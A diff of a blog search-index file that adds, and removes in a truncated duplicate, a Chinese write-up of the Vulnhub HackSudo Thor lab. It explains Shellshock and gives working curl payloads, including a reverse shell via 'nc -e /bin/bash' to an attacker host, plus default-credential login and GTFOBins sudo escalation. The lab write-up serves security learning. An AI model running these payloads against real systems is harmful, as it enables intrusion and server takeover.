@@ -184,6 +184,154 @@
       </tags>
   </entry>
   <entry>
+    <title>10 Vulnhub HackSudoThor Writeup</title>
+    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
+    <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
+<span id="more"></span>
+<h1 id="靶机信息">靶机信息</h1>
+<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
+<p>难度：中</p>
+<p>目标：取得root权限 + 2 Flag</p>
+<p>涉及攻击方法：</p>
+<ul>
+<li>主机发现</li>
+<li>端口扫描</li>
+<li>web路径爬取</li>
+<li><strong>开源源码泄露</strong></li>
+<li>默认账号密码</li>
+<li><strong>破壳漏洞</strong></li>
+<li><strong>GTFOBins提权</strong></li>
+</ul>
+<h1 id="common-gateway-interface-基础">Common Gateway Interface 基础</h1>
+<p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
+<p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
+<p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
+<p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
+<center>
+输入
+</center>
+<p>Web服务器调用某个cgi程序，首先把HTTP请求中的信息以环境变量的方式写入OS，然后CGI程序通过语言库函数来获取环境变量从而获得数据的输入。除此之外，还可以通过标准输入获得数据，比如POST请求调用cgi程序时，cgi程序就会通过标准输入获得body中的数据。</p>
+<p>总结：</p>
+<ol type="1">
+<li>如果不经过HTTP请求，那么cgi程序获得整个OS的环境变量；</li>
+<li>如果经过HTTP请求，那么cgi程序除了获得整个OS的环境变量之外，还会额外获得HTTP头部信息；</li>
+</ol>
+<center>
+输出
+</center>
+<p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
+<h1 id="破壳漏洞">破壳漏洞</h1>
+<h2 id="概述">概述</h2>
+<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
+<h2 id="前置技术">前置技术</h2>
+<p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
+<h3 id="bash基础">bash基础</h3>
+<p>在bash中，可以自定义变量，如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
+<p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
+<p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
+<p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
+<p>将函数导入全局变量之后</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
+<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
+<h2 id="影响的版本">影响的版本</h2>
+<p>bash version &lt;= 4.3</p>
+<h2 id="漏洞复现">漏洞复现</h2>
+<p><a href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
+<h2 id="利用分析">利用分析</h2>
+<p><strong>漏洞原理</strong>：</p>
+<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
+<p><strong>接下来才是漏洞产生的重点：</strong></p>
+<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
+<p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
+<p>并且此时<code>func</code>也会被当作函数执行。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
+<p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
+<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
+<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
+<blockquote>
+<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
+</blockquote>
+<h2 id="利用场景">利用场景</h2>
+<ul>
+<li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
+<li><p>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</p></li>
+</ul>
+<h1 id="渗透">渗透</h1>
+<p>kali：10.0.2.4</p>
+<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
+<ul>
+<li>21端口的服务为ftp</li>
+<li>22端口的服务为ssh</li>
+<li>80端口的服务为http，apache2.4.38</li>
+<li>靶机操作系统为debian</li>
+</ul>
+<h2 id="访问http服务">访问http服务</h2>
+<p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
+<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
+<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
+<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
+<p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
+<p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
+<p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
+<h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
+<p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
+<p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
+<p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
+<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
+<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
+<p>反弹成功！</p>
+<h2 id="权限提升">权限提升</h2>
+<p>首先查看一下sudo配置<code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
+<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
+<p>然后要求我们输入，我们输入几条系统命令看一下</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
+<p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
+<p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
+<p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
+<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a href="https://gtfobins.github.io">gtfobins</a></p>
+<p>网站中提到</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
+<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160607.png" /></p>
+<p>成功提权到root！接下来获取第二个flag<code>/root/root.txt</code></p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160550.png" /></p>
+<p>其实也可以通过<code>/usr/bin/cat</code>直接读取flag。</p>
+<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160915.png" /></p>
+<p>本台靶机到此结束！</p>
+<h1 id="总结">总结</h1>
+<p>该靶机的难度主要在于<strong>破壳漏洞</strong>的发现以及 <strong>GTFOBins漏洞</strong>利用。练习这么多个靶机以来第一次碰到这样的漏洞以及利用方式。</p>
+<p>还有一点，就是如果发现目标站点使用的是开源的框架，可以尝试以下默认的账号和密码。</p>
+]]></content>
+      <tags>
+        <tag>综合</tag>
+        <tag>vulnhub</tag>
+        <tag>破壳漏洞</tag>
+        <tag>开源源码泄露</tag>
+        <tag>GTFOBins提权</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>11 Vulnhub Billu_b0x Writeup</title>
     <url>/2022/04/14/11%20Vulnhub%20Billu_b0x%20Writeup/</url>
     <content><![CDATA[<p>该靶机难度为中等，不过存在多种思路。肯定还有一些我没有记录到。该靶机的漏洞都比较常规，但是组合起来就有了非常好的表现！</p>
@@ -345,275 +493,6 @@
         <tag>图片马</tag>
         <tag>源码审计</tag>
         <tag>任意文件读取</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>10 Vulnhub HackSudoThor Writeup</title>
-    <url>/2022/04/12/10%20Vulnhub%20HackSudoThor%20Writeup/</url>
-    <content><![CDATA[<p>该靶机难度为中等，主要是<strong>破壳漏洞</strong>为第一次遇到，有点没底。</p>
-<span id="more"></span>
-<h1 id="靶机信息">靶机信息</h1>
-<p>靶机地址：<a href="https://www.vulnhub.com/entry/hacksudo-thor,733/">HackSudo: Thor</a></p>
-<p>难度：中</p>
-<p>目标：取得root权限 + 2 Flag</p>
-<p>涉及攻击方法：</p>
-<ul>
-<li>主机发现</li>
-<li>端口扫描</li>
-<li>web路径爬取</li>
-<li><strong>开源源码泄露</strong></li>
-<li>默认账号密码</li>
-<li><strong>破壳漏洞</strong></li>
-<li><strong>GTFOBins提权</strong></li>
-</ul>
-<h1 id="common-gateway-interface-基础">Common Gateway Interface 基础</h1>
-<p>CGI即通用网关接口。通用指的是不受语言限制，理论来说，所有支持标准输出、支持获取环境变量的编程语言都能够编写CGI程序。</p>
-<p>而网关，可以称之为“翻译官”，网关的输入与输出通常是两种不同的协议。比如，一个企业的一台服务器，它的一端连接HTTP协议，另一发可能连接着其他协议，比如企业内部使用的协议。CGI的功能也是如此，通常将CGI部署到Web服务器上，然后由Web服务器调用CGI程序。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412145628.png" /></p>
-<p><strong>接口</strong>，确切而言是“接口协议”。所谓协议，是通信双方或多方都共识并遵守的一套规则。</p>
-<p>其实不管是TCP/IP或是HTTP，都可以统称为“网络协议”，粗浅一点理解就是“<strong>描述报文内容详细语义的协议</strong>”。而“接口协议”却不然，他不会定义哪些字节该写什么，也不会定义字符的内容规范。CGI其实是构架在HTTP协议之上的。它描述的是<strong>另一个维度的共识标准</strong>。</p>
-<center>
-输入
-</center>
-<p>Web服务器调用某个cgi程序，首先把HTTP请求中的信息以环境变量的方式写入OS，然后CGI程序通过语言库函数来获取环境变量从而获得数据的输入。除此之外，还可以通过标准输入获得数据，比如POST请求调用cgi程序时，cgi程序就会通过标准输入获得body中的数据。</p>
-<p>总结：</p>
-<ol type="1">
-<li>如果不经过HTTP请求，那么cgi程序获得整个OS的环境变量；</li>
-<li>如果经过HTTP请求，那么cgi程序除了获得整个OS的环境变量之外，还会额外获得HTTP头部信息；</li>
-</ol>
-<center>
-输出
-</center>
-<p>CGI通过标注输出写数据，需要注意的是，此时CGI承担HTTP协议的响应部分，因此需要将HTTP响应头部也要通过标准输出打印。</p>
-<h1 id="破壳漏洞">破壳漏洞</h1>
-<h2 id="概述">概述</h2>
-<p>Bash 4.3以及之前的版本在处理某些构造的环境变量时存在安全漏洞，向环境变量值内的函数定义后添加多余的字符串会触发此漏洞，攻击者可利用此漏洞改变或绕过环境限制，以执行任意的shell命令,甚至完全控制目标系统。</p>
-<h2 id="前置技术">前置技术</h2>
-<p>参考链接：https://www.freebuf.com/articles/system/279713.html</p>
-<h3 id="bash基础">bash基础</h3>
-<p>在bash中，可以自定义变量，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150632.png" /></p>
-<p>但是定义的这个变量只是局部的，如果用当前的bash从新开启一个子进程，则无法输出</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150720.png" /></p>
-<p>那么如何才能让子进程或者其他进程也能够访问该变量呢？答案就是将该变量设置为环境变量，因为环境变量是全局变量。可以通过<code>export</code>命令添加全局变量</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412150859.png" /></p>
-<p>在bash中还可以定义shell函数并将其导出为环境变量，只要加上参数<code>-f</code>即可。如果不将函数设置为全局变量，那么子进程同样无法使用，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151157.png" /></p>
-<p>将函数导入全局变量之后</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412151245.png" /></p>
-<p>bash中还可以<strong>通过环境变量来定义函数</strong>。当某个环境变量的值以字符串<code>()&#123;</code>的格式作为开头，那么该变量就会被当前的bash当作一个导出函数，该函数仅在当前bash的子进程生效。（版本较高的bash则不能这么做，因此我利用<a href="https://github.com/vulhub/vulhub/blob/master/bash/CVE-2014-6271/README.zh-cn.md">vulhub/bash/shellshock</a>做测试）</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412193956.png" /></p>
-<h2 id="影响的版本">影响的版本</h2>
-<p>bash version &lt;= 4.3</p>
-<h2 id="漏洞复现">漏洞复现</h2>
-<p><a href="https://hdfzzf.icu/2022/04/12/%E5%A4%8D%E7%8E%B0%EF%BC%9ABash%20Shellshock%20%E7%A0%B4%E5%A3%B3%E6%BC%8F%E6%B4%9E%EF%BC%88CVE-2014-6271%EF%BC%89/">复现：Bash Shellshock 破壳漏洞（CVE-2014-6271)</a></p>
-<h2 id="利用分析">利用分析</h2>
-<p><strong>漏洞原理</strong>：</p>
-<p>Bash使用的环境变量是通过函数名称来调用的，导致漏洞出问题是以<code>()&#123;</code>开头定义的环境变量在命令ENV中解析成函数后，Bash执行并未退出，而是继续解析并执行shell命令。而其核心的原因在于在<strong>输入的过滤中没有严格限制边界，也没有做出合法化的参数判断</strong>。</p>
-<p><strong>接下来才是漏洞产生的重点：</strong></p>
-<p>如果我们导入如下的字符串为全局变量： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="built_in">export</span> func=<span class="string">&#x27;() &#123; echo &quot;hello world!&quot;; &#125;; cat /etc/passwd;&#x27;</span></span><br></pre></td></tr></table></figure></p>
-<p>那么在当前进程下<code>func</code>不会被执行。而一旦启动子进程<code>bash</code>，则会立即执行<code>cat /etc/passwd</code>，如下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194456.png" /></p>
-<p>并且此时<code>func</code>也会被当作函数执行。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412194527.png" /></p>
-<p>这是因为子进程<code>bash</code>在加载环境变量时首先将<code>func</code>函数当作环境变量，然后继续加载后面的<code>cat /etc/passwd</code>，此时因为还处在shell中，会将这串字符串当作shell命令执行。因此一旦启动子进程<code>bash</code>，就会立即执行这串代码。</p>
-<p>所以该漏洞需要以下条件： 1. 被攻击的bash存在漏洞（版本小于等于4.3） 2. 攻击者可以控制环境变量 3. 新的bash进程被打开触发漏洞并执行命令</p>
-<p>当 CGI 脚本接收到一次 HTTP 请求 , 它的环境变量就会新增一些条目 , 比如 User-Agent , Connection 等信息。因此 , 在给出的 POC 中 , 我们通过修改 User-Agent 来修改 CGI 环境变量 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">() &#123; :; &#125;; echo; command;</span><br></pre></td></tr></table></figure></p>
-<blockquote>
-<p>中间那个<code>:</code>可以用其他字符代替，一定要有字符！ 中间那个<code>echo</code> 不能省略。HTTP头部信息每一行都是独立的信息，这里的echo就充当换行符。（不是很能理解这里的意思）</p>
-</blockquote>
-<h2 id="利用场景">利用场景</h2>
-<ul>
-<li><p>程序在某一时刻使用 bash 作为脚本解释器处理环境变量赋值</p></li>
-<li><p>环境变量的赋值字符串来源于用户输入 , 且没有通过有效的过滤</p></li>
-</ul>
-<h1 id="渗透">渗透</h1>
-<p>kali：10.0.2.4</p>
-<h2 id="主机发现端口扫描端口服务发现">主机发现、端口扫描、端口服务发现</h2>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo arp-scan -l</span><br><span class="line">sudo nmap -p- 10.0.2.13</span><br><span class="line">sudo nmap -p21,22,80 -sV 10.0.2.13</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143045.png" /></p>
-<ul>
-<li>21端口的服务为ftp</li>
-<li>22端口的服务为ssh</li>
-<li>80端口的服务为http，apache2.4.38</li>
-<li>靶机操作系统为debian</li>
-</ul>
-<h2 id="访问http服务">访问http服务</h2>
-<p>页面是一个登陆界面，尝试了一下弱口令，发现没有用。又去看了源码，没有什么有用的新，然后依次又查看了<code>HOME, NEWS, CONCAT, ABOUT US</code>发现都没有什么有用的信息。不过<code>CONCAT</code>下面有许多个人信息，可以尝试一下账号和密码是否与这有关。</p>
-<p>接着进行路径发现。 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412143520.png" /></p>
-<p>先查看一下<code>README.md</code>，在里面发现了这个网站是用一个开源的框架搭建的，并且还给出了地址 https://github.com/zakee94/online-banking-system</p>
-<p>访问网站，找到了下面这句话： <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">However some important usernames and passwords are provided below :</span><br><span class="line">Username of admin is &quot;admin&quot; &amp; password is &quot;password123&quot;.</span><br><span class="line">Username of most of the customers is their &quot;first_name&quot; &amp; password is their &quot;first_name&quot; followed by &quot;123&quot;.</span><br></pre></td></tr></table></figure></p>
-<p>给出了admin用户的默认账号和密码，以及普通用户的默认账号和默认密码格式。</p>
-<p>除此之外，还扫描出了<code>admin_login.php</code>。这很明显应该是后台登录地址。尝试刚刚获得的默认账号和密码进行登陆。发现直接登录成功了！</p>
-<p>在网站进行信息收集，发现该网站存在着业务逻辑漏洞，也就是可以从后台看到所有人的账号和密码，还可以利用这些密码进行转账，因为该网站没有严格限制登陆密码和支付密码不能一致，所以现存的账号的登录密码和支付密码一致，因此可以盗用这些账号密码，然后登录，之后给自己的账号转账即可。虽然业务逻辑漏洞在打靶过程中没有什么用，但是在现实生活中是直接造成经济损失的。</p>
-<h2 id="破壳漏洞get-shell">破壳漏洞get shell</h2>
-<p>之前在源码中看到了<code>&lt;!-- cgi-bin --&gt;</code>这其实就是使用了CGI技术，使用该技术可能存在着一种漏洞，那就是<strong>破壳漏洞</strong>！</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">dirsearch -u http://10.0.2.13/cgi-bin/ -f -e cgi,sh</span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152211.png" /></p>
-<p>500：表示我们提交的参数在执行过程中发生了错误，但是不代表我们访问的文件不存在，反而证明文件应该是存在的。</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo nmap -p80 --script http-shellshock --script-args uri=/cgi-bin/shell.sh,cmd=ls 10.0.2.13</span><br><span class="line"><span class="comment"># http-shellshock 专门用来测试是否存在破壳漏洞</span></span><br><span class="line"><span class="comment"># 如果最后的命令执行成功，说明存在漏洞</span></span><br><span class="line"><span class="comment"># uri=/cgi-bin/shell.sh 要检测的文件路径</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412152316.png" /></p>
-<p>发现确实存在破壳漏洞。也可以对<code>backup.cgi</code>进行测试一下。下面的代码就利用（<code>-A</code>等价于<code>-H</code>，都是指定<code>user-agent</code>）</p>
-<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; /bin/bash -c &#x27;which nc&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br><span class="line"><span class="comment"># 如果存在nc，就可以利用nc反弹。先用-e的尝试一下，如果不可以再用nc串联</span></span><br></pre></td></tr></table></figure>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412172426.png" /></p>
-<p>此时能够百分之百确定存在破壳漏洞。接着反弹shell <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -H <span class="string">&quot;user-agent:() &#123; :; &#125;; echo; echo; /bin/bash -c &#x27;nc -e /bin/bash 10.0.2.4 4444&#x27;&quot;</span> \http://10.0.2.13/cgi-bin/shell.sh</span><br></pre></td></tr></table></figure></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412154821.png" /></p>
-<p>反弹成功！</p>
-<h2 id="权限提升">权限提升</h2>
-<p>首先查看一下sudo配置<code>sudo -l</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155743.png" /></p>
-<p>发现了奇怪的东西，我们尝试执行一下 <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo -u thor /home/thor/./hammer.sh</span><br></pre></td></tr></table></figure></p>
-<p>然后要求我们输入，我们输入几条系统命令看一下</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412155919.png" /></p>
-<p>猜测：第一个输入点，无论我们输入什么都会被返回；而第二个输入点则会执行命令。刚刚的<code>id</code>可以看出，该程序的权限是<code>thor</code>，如果该程序执行<code>bash</code>则会得到<code>thor</code>权限的bash。</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160049.png" /></p>
-<p>果不其然，成功得到<code>thor</code>的权限。第一个flag在<code>/home/thor/user.txt</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160245.png" /></p>
-<p>然后需要想办法提权到root，再次查看sudo配置<code>sudo -l</code></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160315.png" /></p>
-<p>这里涉及到<strong>GTFOBins提权：针对目标系统自带的应用程序配置不当导致提权</strong>，参考链接：<a href="https://gtfobins.github.io">gtfobins</a></p>
-<p>网站中提到</p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160423.png" /></p>
-<p><img src="https://raw.githubusercontent.com/hdfzzf/Figurebed/main/imgs/20220412160429.png" /></p>
-<p>因为我们需要提权到root，所以使用后者中的<code>Shell</code>的命令，也就是如下命令： <figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">sudo /usr/sbin/service ../../bin/bash</span><br></pre></td></tr></table></figure></p>
